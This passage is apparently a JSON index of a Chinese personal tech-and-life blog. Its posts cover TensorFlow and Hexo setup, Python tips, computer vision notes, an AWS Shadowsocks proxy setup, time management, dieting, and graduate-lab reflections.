接口定义和上述相似。","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"链表","slug":"链表","permalink":"https://cxpeng.cn/tags/%E9%93%BE%E8%A1%A8/"}]},{"title":"2019年总结","slug":"2019年总结","date":"2020-02-01T12:45:22.000Z","updated":"2020-02-13T03:21:20.027Z","comments":true,"path":"archives/154a8569.html","link":"","permalink":"https://cxpeng.cn/archives/154a8569.html","excerpt":"","text":"怎么样开始写东西呢，以前有时间会写点笔记，现在想写点东西就是写不出来，说白了就是写的东西没有逻辑性，别人怎么会看呢。 今天找了解决的方法，心情浮躁的时候是没有逻辑可言的，全凭主观印象去做事，当心情安定下来后，思考东西更为全面，这时把所思所想记录下来，将文字输入到大脑中，分析具体的文字，解决问题就更有效。 那些你起早努力的日子，那些熬夜努力的时光，那些你太累觉得再也站不起来，却依支撑自己起身的夜晚，那才是梦想的力量。 ————-科比 我不想去谈论那些不合适的人，我们彼此根本不懂对方，也不想去了解。 如果你害怕失败，就意味着你已经输了。 水是无形的，如果你将水倒进了被子里，他就变成杯子的形状，你将水放入到瓶子，它就变成瓶子的形状，水可以柔软的流动，也可以坚硬的凝结，像水一样，我的朋友。 ————李小龙，学会适应。 没有信仰的人是没有灵魂的空壳， 人最希望获得建议还是获得支持？ 首先我认为没有绝对完美的决定，经过深思熟虑之后决定有好有坏，将负面效应降低到最小，却仍然不是最好的决定，你会选择获得别人的支持还是祈求得到建议进行改正。 明知道不会变的更好的前提下，你是否还会坚持去做。我们考虑一切的时候，都不会准确站在对方的角度去思考，这使得提出的建议和思考局域局限性，就好比是橘生淮北则为枳，脱离适宜环境下主观意愿都会成为影响他人决定的因素。 虽然不应该完全采纳，那怎么能够接受对自己好却难以实施的意见，三人行必有我师，取其精华去其糟粕，以史为鉴。这些道理无一不说明，听取他人建议的重要性，但是所有的一切都是建立在有多种解决方案的基础上，多种解决方案进行比较，采用最理想的方法。如果不是这个样子，就要做事果断，不要犹豫。 还有重要的一点，不要盲目的下决定或者追风，不了解事情的全貌，只凭主观看法去做事，可能取得意想不到的效果，但是并不是其他任务的做事标准。 认清自己是理工科的思维和逻辑，学会判断，即有果必有因，最大程度还原事情的本相，会帮助自己做判断。","categories":[{"name":"生活随笔","slug":"生活随笔","permalink":"https://cxpeng.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"}],"tags":[]},{"title":"WIN10+TF2.0","slug":"WIN10-TF2-0","date":"2019-12-03T04:28:51.000Z","updated":"2020-02-13T03:24:32.978Z","comments":true,"path":"archives/bb4fe864.html","link":"","permalink":"https://cxpeng.cn/archives/bb4fe864.html","excerpt":"","text":"WIN10+TF2.0+CUDA10.0+cuDNN7.5+OpenCV4.1.2 配置gpu版本的tensorflow完全是小白入门tensorflow的第一步；我的电脑gpu太差也就是仅仅学习下MX250 参考了一些详细的教程，但是对于安装的版本来说有些指定的不太明确，这有个建议就是不要一味的追求新，要注意查找版本之间的关系 开始安装，全文无图。 预准备工作 下载CUDA10.0 下载cuDNN7.5 for CUDA10.0，需要注册后下载，支持微信和QQ 下载Anaconda，直接从官网下载会很慢，推荐将下载链接复制到百度云离线下载中，保存到百度云在进行下载速度快很多。或者直接下载百度云分享：链接：https://pan.baidu.com/s/1BKtXWtUVFl4isthLj4LLPg提取码：ssjs 在cmd中cmd中使用nvidia-smi查看显卡驱动是否正确安装，不过一般没啥问题 安装CUDA10.0 双击exe文件，只需要设置下安装路径就行，记住安装路径选择之后，左右的安装路径请保持一致。 到了驱动安装选项中，不要勾选NVIDAI Experience那个选项，因为我们用不到。 最后会提示没有vs支持，这个需要安装visual studio，勾选选择需要就行，然后就是漫长的安装vs过程，安装过程中选择C++桌面安装就行，选择好安装路径，不要都堆在C盘。 直至安装完成 最后测试下cmd中输入nvcc -V，显示正确的信息则安装完成。 安装cuDNN7.5 解压下载的安装包，打开文件夹，将文件夹中的内容复制到CUDA的安装路径中，这里以D:/CUDAv10.0为例，复制到该文件夹下。 添加环境变量 右击此电脑-高级系统设置-环境变量-系统变量里面的path：里面可以看到CUDA_PATH和CUDA_PATH_V10已经存在，以安装CUDA的路径为D:\\\\CUDAv10.0为例添加以下路径到到path中： D:\\CUDAv10.1\\bin D:\\CUDAv10.1\\include D:\\CUDAv10.1\\lib\\x64 安装Anaconda3 安装过程中只需要设置下安装路径即可 添加环境变量，以安装路径为D:\\Anaconda3为例，添加以下变量到Path D:\\Anaconda3 D:\\Anaconda3\\Scripts D:\\Anaconda3\\Library\\bin 经过上面的步骤就可以在cmd中使用conda，pip，python 安装tensorflow-gpu 现在cmd中升级下pip配置下pip的源，第二部分的问题中有提到具体方法； 使用pip安装 pip install tensorflow-gpu==2.0.0-rc0 等待安装完成 测试是安装成功，cmd下输入 > python >&gt;import tensorflow as tf >&gt;tf.__versioin__ 输出’2.0.0-rc0’ 完成安装 在python中使用opencv 第一步在电脑中下载编译opencv，在另一篇文章中写道opencv安装与配置 以安装路径为D:\\opencv4.1.2\\opencv\\build，找到D:\\opencv4.1.2\\opencv\\build\\python\\cv2\\python-3.7下的以pyd为后缀的文件，拷贝到python所在目录的Lib\\site-packages文件夹下，有必要的话可以将D:\\opencv4.1.2\\opencv\\build\\python\\cv2\\python-3.7添加到环境变量中。 在python中测试： import cv2 as cv cv.__version__ ‘4.1.2’ Tensorflow安装过程中遇到的问题与解决办法： 下载anaconda速度非常慢 将anaconda下载链接复制到百度云离线下载中，保存到百度云进行下载，速度虽然慢（还至少比官网快）但是稳定，当然迅雷应该也是可以； pip安装tensorflow速度很慢 更改pip的源改为清华的镜像源 pip install pip -Upip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple 更改完以后下载库文件直接从这个镜像源下载，速度很快的。 conda更换源 conda config —add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ conda config —set show_channel_urls yes 参考： https://blog.csdn.net/huanyingzhizai/article/details/89298964#%E5%AE%89%E8%A3%85tensorflow1.13(with-Anaconda)) https://blog.csdn.net/huanyingzhizai/article/details/100778893 https://blog.csdn.net/weixin_42267309/article/details/92800901 https://blog.csdn.net/qq_43673118/article/details/90140395 https://blog.csdn.net/ITLearnHall/article/details/81708148 https://blog.csdn.net/howlclat/article/details/78783701","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[]},{"title":"换电脑之博客迁移.md","slug":"换电脑之博客迁移","date":"2019-12-01T05:34:47.000Z","updated":"2020-02-13T03:25:27.203Z","comments":true,"path":"archives/b3404e24.html","link":"","permalink":"https://cxpeng.cn/archives/b3404e24.html","excerpt":"","text":"解决的问题：换电脑使得原来的博客环境失效，现在需要将在新电脑上写博客。解决方法：在新电脑上重新配置hexo 步骤： 1、准备工作 将原来博客中的文件拷贝，然后在新电脑上创建一个Blog文件夹； 下载node.js,官网下载，之后安装，测试安装成功的方法是在cmd下，使用npm –V可以看到输出内容安装成功； 使用npm包管理工具下载hexo，命令为：npm install hexo-cli –g；参考官网 测试hexo安装成功的方式同npm：hexo –V 安装git，官网。然后和配置博客时一样同样需要使用生成公钥，链接GitHub； 2、开始配置 所有的操作都在git bash中操作；在Blog的上一层文件夹下，使用hexo init Blog/命令进行初始化，然后将上面拷贝好的文件中的一下几个文件和文件夹替换Blog文件下的文件：sourcethemes_config.yml 然后 切换到Blog文件夹下，使用命令安装所需要的依赖，这都要看你原本博客中的依赖是什么，因为依赖版本的更新比较快，建议自己重新安装依赖：npm install xxx1 xxx2 xxx3 —save 依赖安装完成后，基本上就可以使用了，同样可以使用hexo s –g 来检查下博客是否能够重新显示，如果没有问题可以写博客部署到服务器试一下，一定要在本地看一下能不能使用成功，否则直接推到服务器很可能使得博客网站不显示。 参考： https://blog.csdn.net/littlehaes/article/details/81503455","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[]},{"title":"计算机视觉在新技术浪潮的革新和挑战","slug":"计算机视觉在新技术浪潮的革新和挑战","date":"2019-09-09T15:15:51.000Z","updated":"2020-02-13T03:25:54.096Z","comments":true,"path":"archives/9bb65d10.html","link":"","permalink":"https://cxpeng.cn/archives/9bb65d10.html","excerpt":"","text":"计算机视觉技术： 让计算机利用抽象出来的算法来进行处理现实中的问题。 计算机视觉的发展离不开硬件和算法的进步。 使用的案例：美国的NASA火星探测器，使用的双目的摄像头。利用双目摄像头采集图像，通过分析图像来得出一些计算和探测的数据信息。 计算机视觉的系统大多是前端和后端两部分：前端使用摄像头，后端借助GPU进行算法计算（机器视觉、图像处理、卷及神经网络）。 下面介绍的是计算机视觉的发展方向： 1、图像处理： 点算子 线性滤波 几何变换、 全局优化 特征检测和匹配 边缘特征 线条特征 特征匹配 运动估计 平移配准 层次运动 光流信息 **深度学习很多灵感来源于传统方法** 2、深度学习技术 神经网络： 输入层，隐藏层，输出层 全连接 激活函数 反向传播BP：提到的是GOOGLE最新提出的论文不需要反向传播的算法，不需要反向传播的原理是什么。 损失函数：计算真实值和算法求出数据的差距 卷积神经网络： 简单的神经网络很难处理图像二维的数据，他需要将二维转变为一维数据，很那捕捉像素之间的联系。 卷积神经网络：模仿人依靠卷积核来获得一定的感受野，提取纹理特征然后一层层感受分析获得信息，首先获得比较浅层的信息，比如边缘什么，越高层获得信息越高层。 卷积核：可以降低模型参数量，可以参数共享 降采样层：降低输入图像在网络中一层一层不断深入的维度，减小内存浪费 全连接： Dropout：解决过拟合的方法之一 3、CNN应用 图像识别： VGG ResNet Inception 目标检测： RCNN SSD YOLO 分割： FCN Mask-RCNN U-Net 前沿探索举例： 目标检测： Anchor-Fre * CornerNet 关键点 图像识别： 粗粒度的图像识别：是猫、是狗等类间 细粒度图像识别：是花猫、是长尾猫等类内。 网络结构改进： 合理复杂度下提升效果 提升信息流效率(跳层连接) 合理效果下提升效率 降低计算损耗 降低内存占用 行业应用举例： 商品识别： 数据采集： 1、手持终端(SFA)采集 图像质量不一 场景变换不确定 数据可用性 模型挑战：增强适应恶劣场景 2、利用机器人特定固定（超市） 图像质量：高像素摄像头 场景变换：固定 数据可用性：高可用 模型挑战：细粒度商品识别 数据预处理 图像质量： 模糊检测 倾斜检测 超分辨率重建 背景去除 模型训练 使用通用检测模型 模型测试 模型服务：实际场景应用 虽然有些因为知识的欠缺很难理解，但是还是可以多思考，在以后补充。 多读论文，多思考、了解新的思路和方法和当前方法的关系。&lt;/br&gt; 【参考】计算机视觉在新技术浪潮的革新和挑战","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[]},{"title":"四象限法则","slug":"四象限法则","date":"2019-09-09T08:49:17.000Z","updated":"2020-02-13T03:21:51.482Z","comments":true,"path":"archives/a66037f0.html","link":"","permalink":"https://cxpeng.cn/archives/a66037f0.html","excerpt":"","text":"时间管理是为了更高的规划自己的时间，更高效的处理身边事务。 第一象限 第二象限 第三象限 第四象限 重要，紧急 重要，不紧急 不重要，紧急 不重要，不紧急 当我们知道了四象限的具体分类标准，那么下一步的问题应该就是怎么来区分生活中的各种事情呢，来里自律的人更进一步呢。划分和解决攻略： 第一象限：需要优先处理并且要花一定的时间解决，不处理或者不解决这类问题，将会带来巨大的影响；比如明天晚上就需要开组会，让你分享。今晚的ppt准备工作和分享练习就是必须要做的。 第二象限：这类事务需要进行预约时间，也就是将事情制定一定的短期或者较长期的计划，按照计划来做事情，虽然不如第一象限的事情棘手，但是拖到时间节点的话就会变成第一象限的事情，使得事情变得更加困难。比如：四六级考试或者是完成绩效考核，按照计划处理事务，会使人做事更有逻辑。 第三象限：这类事，可以亲自去做，或者可以授权别人去做，本身不会产生较大的时间影响。 第四象限：不重要也不紧急，大部分是生活的琐事或者是和交往娱乐相关，于个人成长来说并不一定需要，可有可无，那就可以适当放弃。按照时间规划，在空余时间来解决或者直接不做，远离无聊的生活就行。 除此之外还学到的一点知识是，每天可以解决三件事，每天早晨起来，就吧三件事，按照重要程度依次做完，每天调整进度，在一段时间内，可以发现解决问题的能力会很大的提升。 在B站看到了关于白岩松的采访视频，关于年轻人应该多的去读书，人生就像是一个围棋盘，以读书来获取知识来说，以书找书，每个书就像以一个围棋点，慢慢的，点就有了联系，一个个成了面，就起势了。同时也说道了去除焦虑感的方法，那就是做长跑，做坚持到最后的”傻子”，这个时代聪明人太多了，要学会关注变化世界中不变的点，去深耕自己。 【参考】白岩松采访视频","categories":[{"name":"生活随笔","slug":"生活随笔","permalink":"https://cxpeng.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"}],"tags":[]},{"title":"Ubuntu修改系统编码","slug":"Ubuntu修改系统编码","date":"2019-09-05T15:38:36.000Z","updated":"2020-02-13T03:24:27.805Z","comments":true,"path":"archives/2fa3a8c0.html","link":"","permalink":"https://cxpeng.cn/archives/2fa3a8c0.html","excerpt":"","text":"问题：刚开始装系统的时候是全英文的环境，可是出现一些中文乱码。所以改为中文编码方式 解决： 1、使用 locale 命令查看系统当前编码 1LANG&#x3D;zh_CN.UTF-82LANGUAGE&#x3D;zh_CN:zh3LC_CTYPE&#x3D;&quot;zh_CN.UTF-8&quot;4LC_NUMERIC&#x3D;&quot;zh_CN.UTF-8&quot;5LC_TIME&#x3D;&quot;zh_CN.UTF-8&quot;6LC_COLLATE&#x3D;&quot;zh_CN.UTF-8&quot;7LC_MONETARY&#x3D;&quot;zh_CN.UTF-8&quot;8LC_MESSAGES&#x3D;&quot;zh_CN.UTF-8&quot;9LC_PAPER&#x3D;&quot;zh_CN.UTF-8&quot;10LC_NAME&#x3D;&quot;zh_CN.UTF-8&quot;11LC_ADDRESS&#x3D;&quot;zh_CN.UTF-8&quot;12LC_TELEPHONE&#x3D;&quot;zh_CN.UTF-8&quot;13LC_MEASUREMENT&#x3D;&quot;zh_CN.UTF-8&quot;14LC_IDENTIFICATION&#x3D;&quot;zh_CN.UTF-8&quot;15LC_ALL&#x3D;zh_CN.UTF-8 2、修改 /etc/default/locales 文件: 1LANG&#x3D;&quot;zh_CN.UTF-8&quot;2LANGUAGE&#x3D;&quot;zh_CN:zh&quot;3LC_ALL&#x3D;&quot;zh_CN.UTF-8&quot; 3、最后重启Ubuntu系统： reboot -n 重启之后系统提示是否要进行修改名称，可选择保留旧名称，方便以后在终端的使用。","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[]},{"title":"9月计划表","slug":"计划表","date":"2019-09-05T15:38:36.000Z","updated":"2020-02-13T03:22:12.600Z","comments":true,"path":"archives/c9ac5c9b.html","link":"","permalink":"https://cxpeng.cn/archives/c9ac5c9b.html","excerpt":"","text":"9月份计划表 1、培训班学习 下午到晚上下周一之前整理出来，csdn学习2天赶上，一天整理出来文档。一小时一周的进度。主要是理解代码周四到周五打完所有的文档中的程序，理解相关的知识。周六整理文档，并进行理解。 上传到网站。 2、就业准备 每晚上用一个小时完成华为的笔试刷题。从11点开始到睡觉前 能赶上下周四的笔试。 早晨起床开始看半小时研究5g的相关技术，了解。 早晨c++基本知识 撸起袖子加油干!","categories":[{"name":"生活随笔","slug":"生活随笔","permalink":"https://cxpeng.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"}],"tags":[]},{"title":"减肥","slug":"减肥笔记","date":"2019-09-01T06:56:39.000Z","updated":"2020-06-06T07:21:44.041Z","comments":true,"path":"archives/494fcdcb.html","link":"","permalink":"https://cxpeng.cn/archives/494fcdcb.html","excerpt":"","text":"减肥的方法：每天创造热量缺口 热量计算方式：大卡=千焦/4 基础代谢：90kg-2100大卡 热量缺口：热量的缺口指的是每天的基础代谢+运动-摄入热量（饮食），每天保持热量缺口400-700就可以进行减肥 每天可以瘦0.15斤 标准是：7700大卡～1kg 饮食结构： 碳水4、蛋白质4、脂肪9：摄入比例为：0.6/0.15/0.25 碳水、蛋白质、脂肪：315g/78.75g/58.33g 按照比例进食，可以采取的方式，少食多餐，多吃低热量的食物来保持饱腹感。少食高热量食物，仅仅当做是一小部分零食来吃。 运动： 运动的目的是满足饮食欲望，减肥是考虑能量缺口，运动多了，缺口增大，就算饮食增多，同样每天可以保持一个稳定热量缺口。 无氧运动：先消耗糖原然后在消耗脂肪，同时锻炼了肌肉，增加人体的运动代谢。这会导致人体糖原缺口增大，使得饮食大部分去补充糖原，一小部分补充给脂肪。持续锻炼无氧运动，会使得脂肪含量减低，但是也会使得人体消耗糖原大，使得吃的东西增多。一旦停止运动要同时停止进食的增多。所以要注意保持良好运动习惯至关重要。 有氧运动：吃东西补充自身的原理和无氧运动同理，不同点在于有氧运动不会增加个人的运动代谢，也就是不断的有氧运动，身体的脂肪和糖原的补充比例不会变化，也就是脂肪含量只会随着恒定的能量缺口进行下降，效果较无氧运动稍差一点，好在有氧运动的入门门槛低，其目的在于提高人的心肺代谢能力，提高耐力等。可以为下一步无氧运动做准备，心扉能力提高了，无氧运动的效果会更好。 运动习惯养成：培养自己运动的习惯，可以采用大目标分成小目标。比如先快走然后再30分钟后在进行慢跑。慢慢养成习惯之后在转变运动方式，比如进阶为全程慢跑，间歇HIIT等。 从小目标开始。每天关注进步，阶段性关注体重。 最最最重要的一点是养成运动习惯防止反弹。ps: 血的教训，减掉20斤后反弹了30斤。 呜～～～～。","categories":[{"name":"减肥之路","slug":"减肥之路","permalink":"https://cxpeng.cn/categories/%E5%87%8F%E8%82%A5%E4%B9%8B%E8%B7%AF/"}],"tags":[]},{"title":"关闭vpn之后浏览器无法连接网络","slug":"关闭vpn之后浏览器无法连接网络","date":"2019-06-01T06:56:39.000Z","updated":"2020-02-13T03:25:02.331Z","comments":true,"path":"archives/a4692f1.html","link":"","permalink":"https://cxpeng.cn/archives/a4692f1.html","excerpt":"","text":"原本使用了学校的vpn和买的vpn可以访问某些外网，但是在访问国内的网络时需要经常验证，所以为了省去验证时间需要关闭vpn，但是关闭vpn之后浏览器就不能够上网。 解决的方法记录： 就chrome而言： 打开设置 滑到底部打开高级 点击使用代理设置 点击LAN设置 如下图设置 大功告成！","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[]},{"title":"阶段学习心得","slug":"阶段学习心得","date":"2019-05-13T02:35:49.000Z","updated":"2020-02-13T03:26:17.413Z","comments":true,"path":"archives/4555512d.html","link":"","permalink":"https://cxpeng.cn/archives/4555512d.html","excerpt":"","text":"1、无论什么语言：首先需要掌握好基本的使用知识，能够做到去实际只用代码工具之后，在详细的研究其内在原理，更容易掌握该语言。也就是说学习过程一般经历新手小白-熟练使用-熟练创造工具-大师级别专精某种编程语言，掌握好解决问题的思路在进行扩展的学习，就招聘会的现场来看，Python语言远没有很大的需求，更多的是c/c++和Java。","categories":[{"name":"生活随笔","slug":"生活随笔","permalink":"https://cxpeng.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"}],"tags":[]},{"title":"Xshell连接远程主机","slug":"Xshell连接远程主机","date":"2019-05-10T11:51:59.000Z","updated":"2020-02-13T03:24:43.930Z","comments":true,"path":"archives/1b44cf9e.html","link":"","permalink":"https://cxpeng.cn/archives/1b44cf9e.html","excerpt":"","text":"ssh被用来远程登录，是一种安全外壳协议，可以在不安全的网络中可以和远程通信。 在Windows中Xshell 和 SecureCRT都是可以使用ssh协议来进行远程连接服务器的工具软件。在这里我使用的是Xshell6软件，首先要确保已经安装了软件，并且在本地有了服务器的公钥，前面的一篇文章已经提到了，怎么申请AWS服务器一年的使用，怎么样在本地连接服务器。这篇文章是考虑到实验室环境中为了安全防火，会在夜晚关掉电闸，所以想在服务器上跑代码，体毛需求。 打开文件—打开—会话中属性—然后做下面的修改： 然后回到你的远程主机里面进行安装用lrzsz，一个可以用来上传和下载的小工具。 sudo apt-get install lrzsz 安装完成之后我们就可以在通过以下命令进行文件传输 rz filename 将本地文件传到远程 sz filename 将远程文件下载到本地 1、注意以上是在远程主机里面进行的，这样理解上面的命令就简单了，rz就是receive 也就是接收本地上传的文件，sz也就是send将文件发送到本地。同时在Xshell支持输入命令rz回车会让你跳出窗口进行选择文件。 2、注意要保存的文件必须拥有可以访问的权限，这时候就会用到chmod命令进行管理或者更换文件夹。 当然进行文件传输的方式有多种，这里仅仅介绍了一种，可以正常使用。还有方法就是在github上建立远程仓库然后在本地和服务器上进行代码的同步。","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[]},{"title":"[科学上网]使用AWS搭梯子记录","slug":"科学上网-使用AWS搭梯子实录","date":"2019-04-28T11:03:55.000Z","updated":"2020-02-13T03:25:39.844Z","comments":true,"path":"archives/bdb009c5.html","link":"","permalink":"https://cxpeng.cn/archives/bdb009c5.html","excerpt":"","text":"感觉现在做什么事情都是奔着免费去的。 这是一篇免费搭建梯子的实录： 准备： 进入AWS云官网，注册一个亚马逊账号。 信用卡，需要绑定账号，否则无法使用云服务,刚开始会扣1刀，但是现在EC2可以免费使用一年。 Xshell用来远程登录实例 shadowsocks:用作系统代理，在Windows中下载安装使用 基本上是按照步骤介绍的工具准备,然后是按照下面的步骤进行 注册账号，没什么可说的，简单 右上角选择区域，选择东京或者新加坡 右上角我的账户-控制台，找到左上角：服务-计算-EC2，点击进去，然后点击启动实例 选择AMI 选择实例类型 配置实例，下一步 添加存储 添加标签，下一步 配置安全组 下一步进行审核审核，选择生成密钥对，下载，用来在Xshell远程连接。 这样就生成了一个实例： 下面通过Xshell远程登录：步骤如下： 在实例中安装shadowsocks服务端 安装pip sudo apt update sudo apt-get install python-pip 利用pip安装shadowsocks sudo pip install shadowsocks 开启服务 sudo ssserver -p port -k password -m aes-256-cfb -d start #这里的port和password都是自己指定 下载shadowsocks客户端进行如下配置： 最后一步，就是进入Google Enjoy it！","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"科学上网","slug":"科学上网","permalink":"https://cxpeng.cn/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"},{"name":"AWS","slug":"AWS","permalink":"https://cxpeng.cn/tags/AWS/"},{"name":"免费","slug":"免费","permalink":"https://cxpeng.cn/tags/%E5%85%8D%E8%B4%B9/"}]},{"title":"Python2和Python3的区别","slug":"Python2和Python3的区别","date":"2019-04-24T07:34:54.000Z","updated":"2020-02-13T03:24:03.436Z","comments":true,"path":"archives/ac4af3ca.html","link":"","permalink":"https://cxpeng.cn/archives/ac4af3ca.html","excerpt":"","text":"2008年，Python 3.0发布标志着Python语言打破了后向兼容，开始进化。 print—&gt;print()：将一条语句变为一个内置函数 默认情况下字符串变为Unicode编码 增加单例类型 更新异常：增加了as关键字，使得语句更加简洁 整数更新：long整型在Python3中消失，多有的数表现为long类型；除法更新python3中’/‘永远返回浮点数。 迭代无处不在：Python3中使用迭代器可以有效保护内存。如map() filter() range() zip() keys() values() items() 生成器：在python3.x中生成器的next()方法变为next()方法","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://cxpeng.cn/tags/Python/"}]},{"title":"Python中模块的使用","slug":"Python中模块的使用","date":"2019-04-18T14:07:58.000Z","updated":"2020-02-13T03:24:07.070Z","comments":true,"path":"archives/fe2495d8.html","link":"","permalink":"https://cxpeng.cn/archives/fe2495d8.html","excerpt":"","text":"关于模块：Python模块索引大全 随着程序的不断变大，需要将程序分为很多文件，创建成模块，一个.py文件就是一个模块。 从目录中来导入模块，相应的目录称之为包package。使用import语句创建了一个命名空间，并在该命名空间中执行与.py相关的所有语句，要在导入后访问命名空间的内容，只要使用模块的名称当做前缀，就可以访问模块中的内容。 为了避免使用的模块名字与他人的重名，可以将模块打包成一个特定的包，要求包名不能与系统模块重名，并且包内必须有init.py，它也是一个模块，并且模块的名字就为包的名字。 在程序中时经常要对模块的功能进行测试时候，在模块中的话经常用到下面一句： if name == “main“: test() 当我们在命令行运行模块文件时，Python解释器把一个特殊变量name置为main，这样就可以使得test代码在模块内部使用，而在模块外部调用模块时不运行test函数。 编写模块时需要考虑隐藏内部细节，设置私有函数来隐藏细节，需要访问时可以在公开访问的函数中函数中可以调用这些私有方法而不让模块使用者看到内部操作细节。这样可以做到代码的封装和抽象。 dir()可以列出模块的内容，访问doc()可以得到描述函数用途的字符串","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://cxpeng.cn/tags/Python/"},{"name":"模块","slug":"模块","permalink":"https://cxpeng.cn/tags/%E6%A8%A1%E5%9D%97/"}]},{"title":"Python中的小知识","slug":"Python中的小知识","date":"2019-04-16T09:05:20.000Z","updated":"2020-02-13T03:24:15.744Z","comments":true,"path":"archives/55a385d1.html","link":"","permalink":"https://cxpeng.cn/archives/55a385d1.html","excerpt":"","text":"怎么样使用Python才会显得高大上呢！，用Python来解决一些问题相当简单，有了思路就可以动手去做了，但是既然知道了Python的特性，就要在coding中注意代码的质量和简洁性。 一、首先，Python含有很多类库、可扩展库，还有很多开源项目，但是不能忽略其中的内置函数库，下面通过演示使用内置函数，提高编写代码的质量的简洁性。 内置函数enumerate来代替range()进行迭代。enumerate可以返回每个元素的索引和值。 enumerate(list, start=num)# 可以通过设置start来设置其实偏移量 列表推导式比map和filter函数表达更加清晰 列表推导式更容易使得代码变得可读。 使用breakpoint来进行调试而不是print 事实情况就是在编码过程中使用print很不美观并且导致代码很乱 使用f-string来格式化字符串 f-string支持使用字符串格式化迷你语言和字符串插值 name, age = cook, 12 return f’my name is {name} and i`m {age/10.5f} decades old.’ 使用sorted()对复杂列表进行排序 sorted()#设置reverse可以进行降序排序，设置key可以设置以什么字段排序 二、以后其次进行算法面试过程中，数据结构是考察的重点，在编码过程中要注意选择合适的数据结构来实现思路。 使用set存储唯一值 可以在数据集中删除重复的值 利用生成器来生成大量序列，这样更省内存。在读取大量数据到内存中进行计算中有明显优势。 使用字典的get(key, default)方法，它的作用就是检查key是否在字典中，在的话返回key的value不在的话返回默认。 但是如果想用默认值来更新key中的value 呢，则需要使用字典的setdefault(key, default)方法.即查找key是否在dict中，如果存在返回value，如果不存在使用default值更新字典。 三、学会使用标准库将会事半功倍 使用collections.defaultdict处理缺少的字典键， from import defaultdict new_dict = defaultdict(list)#使用无参数的list作为默认值，当名字不存在时返回一个空列表[] 这一部分不太明白找时间看源码 collections.Counter来计算Hashable对象 Couter是dict的子类，使用0作为任何缺失元素的默认值，并且更容易计算对象的出现次数。 将单词传入给Counter时，会存储每个单词和单词在列表中出现的次数。 调用most_common可以返回最多出现的单词 使用字符串常量访问公共字符串组 12import string34string.ascii_uppercase# \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" 使用Itertools生成排列和组合 itertools.permutations()#生成所有可能，顺序有效 itertools.combinations()#去掉重复可能，无关顺序","categories":[{"name":"技术经验","slug":"技术经验","permalink":"https://cxpeng.cn/categories/%E6%8A%80%E6%9C%AF%E7%BB%8F%E9%AA%8C/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://cxpeng.cn/tags/Python/"}]},{"title":"悠悠天地，奈何独立苍茫","slug":"悠悠天地，奈何独立苍茫","date":"2019-04-16T08:29:00.000Z","updated":"2020-02-13T03:21:56.830Z","comments":true,"path":"archives/c82868cc.html","link":"","permalink":"https://cxpeng.cn/archives/c82868cc.html","excerpt":"","text":"悠悠天地，奈何独立苍茫！ 又一届师哥师姐毕业了，看着实验室只剩自己一个人关电闸，差点眼泪掉下来。自己一个人呆着就回忆起来这两年的读研经历。 刚想起来并不是自己一个人在这里，实验室还有老鼠陪着我，要是说刚进实验室的时候，给我印象最深的也就是这帮老鼠了，一开门就是满桌子的老鼠屎，一桌拉完还有另外一桌，虽说没有什么味道，但还是挺恶心。更没想到的是，到最后排列杂乱的排泄物还是我最近清理掉的，前前后后经历了一年！门口路由器旁边坐的是一个胖胖的师哥，那时候他手里就有SCI在手，仍然奋斗在仿真一线，用他话说就是“没办法啊，老师还让我发一篇”，真是招人羡慕。之后所里的人都到齐了，不多不少三男一女，妥了！再然后就是一两个月的熟悉期，师哥给我们介绍了所里的环境和人际关系，更重要的是介绍了毕业答辩等一系列的事情，简直是读研手册，就这样几个人在这个破所里面，慢慢适应、交流，充满人情味。之后就是面临中期的开题，我开始出现了焦虑恐惧症，一是因为我真的没有思路，二是老师只问我我怎么想，那段时间整天就是查文献，翻译文献，定方案，写总结，最后一个方案没有出来，没办法去找老师交流，交流也是无功而返，还是那一句你怎么想，其实我的梦想就是老师你也给我几篇文献我去研究下，让我毕业就好！少年不知愁滋味，读了研才知道水这么深的，总之最后还是定了一个的方案，全程自己搞，最后答辩当然是哗啦啦。答辩甜蜜期过完，就进入论文准备阶段。 